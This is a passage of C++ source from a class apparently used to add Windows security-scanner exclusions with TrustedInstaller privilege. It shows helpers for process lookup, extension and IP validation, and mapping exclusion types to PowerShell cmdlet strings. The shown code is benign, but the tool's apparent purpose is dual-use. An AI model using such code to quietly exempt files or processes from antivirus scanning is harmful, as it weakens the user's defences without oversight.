    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    DWORD pid = 0;
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (wcscmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pid;
}

/**
 * @brief Validates that a string is a plausible file extension.
 */
bool TrustedInstallerIntegrator::ValidateExtension(const std::wstring& extension) noexcept
{
    if (extension.empty()) return false;
    const std::wstring invalidChars = L"\\/:*?\"<>|";
    for (wchar_t c : extension) {
        if (invalidChars.find(c) != std::wstring::npos) return false;
    }
    return true;
}

/**
 * @brief Performs a basic validation of an IPv4 address string, with optional CIDR notation.
 */
bool TrustedInstallerIntegrator::ValidateIpAddress(const std::wstring& ipAddress) noexcept
{
    if (ipAddress.empty()) return false;

    std::string narrowIp;
    for (wchar_t c : ipAddress) {
        if (c > 127) return false; // Non-ASCII.
        narrowIp.push_back(static_cast<char>(c));
    }

    size_t slashPos = narrowIp.find('/');
    std::string ipPart = (slashPos != std::string::npos) ? narrowIp.substr(0, slashPos) : narrowIp;
    
    if (std::count(ipPart.begin(), ipPart.end(), '.') != 3) return false;

    for (char c : ipPart) {
        if (!std::isdigit(c) && c != '.') return false;
    }
    
    if (slashPos != std::string::npos) {
        std::string cidr = narrowIp.substr(slashPos + 1);
        if (cidr.empty() || !std::all_of(cidr.begin(), cidr.end(), ::isdigit)) return false;
        try {
            int cidrValue = std::stoi(cidr);
            if (cidrValue < 0 || cidrValue > 32) return false;
        } catch (...) { return false; }
    }
    
    return true;
}

/**
 * @brief Ensures a file extension starts with a dot.
 */
std::wstring TrustedInstallerIntegrator::NormalizeExtension(const std::wstring& extension) noexcept
{
    if (extension.empty()) return extension;
    return (extension[0] != L'.') ? (L"." + extension) : extension;
}

/**
 * @brief Converts an ExclusionType enum to the string required by PowerShell cmdlets.
 */
std::wstring TrustedInstallerIntegrator::GetExclusionTypeString(ExclusionType type) noexcept
{
    switch (type) {
        case ExclusionType::Paths:      return L"Path";
        case ExclusionType::Processes:  return L"Process";
        case ExclusionType::Extensions: return L"Extension";
        case ExclusionType::IpAddresses: return L"IpAddress";
        default:                        return L"Path";
    }
}